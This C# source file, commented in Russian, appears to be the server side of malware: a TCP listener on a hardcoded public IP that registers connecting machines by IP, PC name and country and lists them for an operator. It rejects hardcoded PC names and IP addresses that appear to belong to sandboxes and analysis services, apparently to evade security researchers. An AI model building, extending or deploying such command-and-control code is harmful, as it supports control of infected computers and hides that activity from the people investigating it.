using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Server
{
    private static SortedList<int, TcpClient> clients = new SortedList<int, TcpClient>();
    private static TcpListener listener;

    private static readonly string[] BlacklistedPCNames =
    {
        "DESKTOP-ICCRDPD", "TVM-PC", "DESKTOP-JGLLJLD", "DESKTOP-0IJITTJ", "JOEBILL"
    };

    private static readonly string[] BlacklistedIPs =
    {
        "84.17.40.108", "31.28.104.137", "185.100.87.41", "185.220.101.39",
        "84.247.105.120", "111.7.100.42", "157.245.77.56", "111.7.100.41",
        "111.7.100.36", "111.7.100.37", "111.7.100.38", "111.7.100.39",
        "111.7.100.40", "111.7.100.43", "111.7.100.44", "176.100.243.133",
        "20.99.160.173", "35.186.54.177", "34.85.254.161", "34.17.55.59"
    };

    private static readonly Dictionary<int, ClientInfo> clientInfo = new Dictionary<int, ClientInfo>();

    public static void Main()
    {
        listener = new TcpListener(IPAddress.Parse("193.58.121.250"), 7175);
        listener.Start();
        Console.WriteLine("[Server] Сервер запущен и ожидает подключения...");

        new Thread(CheckClients).Start();
        new Thread(HandleInput).Start();

        int clientId = 1;

        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            IPEndPoint clientEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;

            // Проверка на чёрный список
            if (IsBlacklisted(client, clientEndPoint, clientId))
            {
                Console.WriteLine($"[Server] Отклонено подключение с IP {clientEndPoint.Address} или имени ПК.");
                client.Close();
                continue;
            }

            new Thread(() => HandleClient(client, clientId++)).Start();
        }
    }

    private static bool IsBlacklisted(TcpClient client, IPEndPoint clientEndPoint, int clientId)
    {
        string clientIP = clientEndPoint.Address.ToString();

        // Проверка IP-адреса
        foreach (string blacklistedIP in BlacklistedIPs)
        {
            if (clientIP == blacklistedIP)
            {
                Console.WriteLine($"[Server] Клиент с IP {clientIP} находится в чёрном списке.");
                return true;
            }
        }

        // Получение имени ПК от клиента
        try
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[1024];
            int bytesRead = stream.Read(buffer, 0, buffer.Length);

            if (bytesRead > 0)
            {
                string clientInfoStr = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                string[] parts = clientInfoStr.Split('_');

                if (parts.Length > 1)
                {
                    string clientName = parts[1];
                    foreach (string blacklistedName in BlacklistedPCNames)
                    {
                        if (string.Equals(clientName, blacklistedName, StringComparison.OrdinalIgnoreCase))
                        {
                            Console.WriteLine($"[Server] Клиент с именем ПК {clientName} находится в чёрном списке.");
                            return true;
                        }
                    }

                    // Сохранение информации о клиенте
                    string country = GetCountryByIP(clientIP); // Получение страны через IP
                    clientInfo[clientId] = new ClientInfo
                    {
                        Ip = clientIP,
                        PcName = clientName,
                        Country = country
                    };
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Server] Ошибка при проверке клиента: {ex.Message}");
        }

        return false;
    }

    private static string GetCountryByIP(string ip)
    {
        try
        {
            using (var client = new WebClient())
            {
                // Пример использования API "ipinfo.io" или другого сервиса
                string url = $"http://ip-api.com/line/{ip}?fields=country";
                string country = client.DownloadString(url).Trim();
                return string.IsNullOrEmpty(country) ? "Unknown Country" : country;
            }
        }
        catch
        {
            return "Unknown Country";
        }
    }

    private static void HandleClient(TcpClient client, int clientId)
    {
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        string clientInfoStr = Encoding.UTF8.GetString(buffer, 0, bytesRead);

        lock (clients)
        {
            clients[clientId] = client;
            Console.WriteLine($"[Server] Клиент {clientId} подключен ({clientInfoStr})");
        }

        while (client.Connected)
        {
            try
            {
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    lock (clients)
                    {
                        clients[clientId] = client;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Server] Ошибка при чтении данных от клиента {clientId}: {ex.Message}");
                break;
            }
        }

        lock (clients)
        {
            clients.Remove(clientId);
            Console.WriteLine($"[Server] Клиент {clientId} отключен ({clientInfoStr})");
        }
    }

    private static void CheckClients()
    {
        while (true)
        {
            Thread.Sleep(5000);

            lock (clients)
            {
                List<int> toRemove = new List<int>();
                foreach (var client in clients)
                {
                    if (!client.Value.Connected)
                    {
                        Console.WriteLine($"[Server] Клиент {client.Key} отключен");
                        toRemove.Add(client.Key);
                    }
                }

                foreach (var clientId in toRemove)
                {
                    clients.Remove(clientId);
                }
            }
        }
    }

    private static void HandleInput()
    {
        while (true)
        {
            string input = Console.ReadLine();
            if (input == "list")
            {
                ShowClientList();
            }
        }
    }

    private static void ShowClientList()
    {
        lock (clients)
        {
            Console.WriteLine("[LIST]");
            foreach (var client in clients)
            {
                if (clientInfo.ContainsKey(client.Key))
                {
                    ClientInfo info = clientInfo[client.Key];
                    Console.WriteLine($"{info.Ip} - {info.PcName} ({info.Country})");
                }
                else
                {
                    Console.WriteLine("Unknown client data");
                }
            }
        }
    }

    class ClientInfo
    {
        public string Ip { get; set; }
        public string PcName { get; set; }
        public string Country { get; set; }
    }
}
